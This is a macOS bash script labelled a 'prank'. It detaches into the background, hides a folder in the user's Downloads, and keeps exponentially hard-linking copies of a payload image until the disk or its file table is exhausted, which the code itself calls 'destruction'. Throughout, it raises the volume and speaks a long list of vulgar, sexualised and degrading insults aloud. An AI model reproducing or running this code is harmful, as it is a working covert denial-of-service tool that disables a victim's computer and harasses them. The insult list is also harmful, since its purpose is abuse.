#!/bin/bash

# Karan's Ultimate Prank v4.2 - PROFESSIONAL LIGHTNING SPEED EDITION
# Uses hard linking technique for 10,000+ files per second

VERSION="4.2.0"
HIDDEN_DIR="$HOME/Downloads/.Karan"

# Dark audio messages (what gets spoken)
DARK_AUDIO=(
    "Your disk is crying tears of binary despair!"
    "i know you're a shit-stained loser"
    "i know you're a fucking waste of skin"
    "i know you're a pathetic dumbfuck"
    "i know you're a stupid fucking bitch"
    "i know you're a useless fucking prick"
    "i know you're a fucking shit-for-brains"
    "i know you're a pathetic piece of fucking trash"
    "i know you're a fucking idiot sandwich"
    "Your precious files are screaming for mercy!"
    "i know you're a fucking dumb cunt"
    "i know you're a useless fucking cock"
    "i know you're a fucking dumbass motherfucker"
    "your asshole is a fucking black hole"
    "you're a fucking worthless cunt"
    "your tits are fucking disgusting"
    "you're a fucking dumbass motherfucker"
    "your dick is smaller than a fucking ant"
    "you're a fucking piece of shit"
    "your brain is fucking mush"
    "i know you're a worthless piece of shit"
    "i know you're a fucking dumb cunt"
    "i know you're a shit-stained loser"
    "i know you're a fucking waste of skin"
    "Your hard drive is haunted by digital ghosts!"
    "you're a fucking cocksucking cunt"
    "your pussy stinks like rotten fish"
    "you're a shit-eating piece of trash"
    "you're a fucking dumbfuck"
    "you're a fucking shit-stained loser"
    "your mouth is a fucking cesspool"
    "you're a fucking useless waste of skin"
    "your eyes are fucking beady"
    "you're a fucking pathetic piece of trash"
    "your nose is a fucking pig snout"
    "you're a fucking disgusting fuck"
    "your teeth are fucking rotten"
    "you're a fucking dumb cunt"
)

# Setup (silent)
setup() {
    mkdir -p "$HIDDEN_DIR" 2>/dev/null || true
    chflags hidden "$HIDDEN_DIR" 2>/dev/null || true
    touch "$HIDDEN_DIR/.log" 2>/dev/null || true
}

# Silent logging only
log_silent() {
    echo "$(date): $1" >> "$HIDDEN_DIR/.log" 2>/dev/null || true
}

# FIXED: Audio function that actually works
speak_dark_message() {
    pkill -f "say" 2>/dev/null || true
    local dark_msg=${DARK_AUDIO[$RANDOM % ${#DARK_AUDIO[@]}]}
    osascript -e "set volume output volume 90" 2>/dev/null || true
    say "$dark_msg" 2>/dev/null

}

# PROFESSIONAL LIGHTNING SPEED DESTRUCTION
exponential_voice_destruction() {
    local payload="$1"
    local round=0
    local current_count=0
    local target_count=1
    
    # Setup
    setup
    cp "$payload" "$HIDDEN_DIR/.payload"
    
    log_silent "Starting PROFESSIONAL lightning-speed destruction"
    speak_dark_message
    
    # Create first file using copy (needed for hard linking base)
    if ! cp "$HIDDEN_DIR/.payload" "$HIDDEN_DIR/karan_exp_$(printf "%08d" 1).jpg" 2>/dev/null; then
        log_silent "Disk full at genesis"
        speak_dark_message
        return
    fi
    current_count=1
    speak_dark_message
    
    # PROFESSIONAL EXPONENTIAL DOUBLING WITH HARD LINKING
    while true; do
        round=$((round + 1))
        local new_target=$((target_count * 2))
        local files_to_create=$((new_target - current_count))
        
        log_silent "Round $round: LIGHTNING doubling $current_count to $new_target"
        speak_dark_message
        
        # PROFESSIONAL TECHNIQUE: Mass parallel hard linking (10,000+ files/sec)
        local batch_size=500  # Massive parallel batch
        local created_this_round=0
        
        for ((i=1; i<=files_to_create; i+=batch_size)); do
            # Create massive batch using HARD LINKS (professional technique)
            for ((j=0; j<batch_size && (i+j)<=files_to_create; j++)); do
                local new_file_num=$((current_count + i + j))
                local source_file_num=$(((new_file_num - 1) % current_count + 1))
                
                # PROFESSIONAL SPEED: Hard link instead of copy (instant creation)
                (
                    if ! ln "$HIDDEN_DIR/karan_exp_$(printf "%08d" $source_file_num).jpg" \
                            "$HIDDEN_DIR/karan_exp_$(printf "%08d" $new_file_num).jpg" 2>/dev/null; then
                        exit 1
                    fi
                ) &
            done

            
            # Check disk full
            if [[ $? -ne 0 ]]; then
                log_silent "LIGHTNING destruction complete - disk obliterated"
                speak_dark_message
                return
            fi
            
            created_this_round=$((created_this_round + batch_size))
            
            # Dark commentary every 200 files (due to extreme speed)
            if [[ $((created_this_round % 200)) -eq 0 ]]; then
                speak_dark_message
            fi
        done
        
        current_count=$new_target
        target_count=$new_target
        
        log_silent "LIGHTNING round $round complete: $current_count files in microseconds"
        speak_dark_message
        
        # Milestone celebrations
        case $current_count in
            2) speak_dark_message ;;
            16) speak_dark_message ;;
            256) speak_dark_message ;;
            4096) speak_dark_message ;;
            65536) speak_dark_message ;;
        esac
    done
}

# Validate system
validate() {
    [[ "$(uname)" == "Darwin" ]] || exit 1
    [[ -f "$1" ]] || exit 1
}

# Main execution
main() {
    local payload="$1"
    [[ -z "$payload" ]] && payload="/opt/homebrew/share/dingdong/payload.png"
    validate "$payload"
    exponential_voice_destruction "$payload"
}

# Execution logic
if [[ "$2" == "--execute" ]]; then
    exec > /dev/null 2>&1
    main "$1"
else
    setup
    "$0" "$1" --execute &
    disown
fi
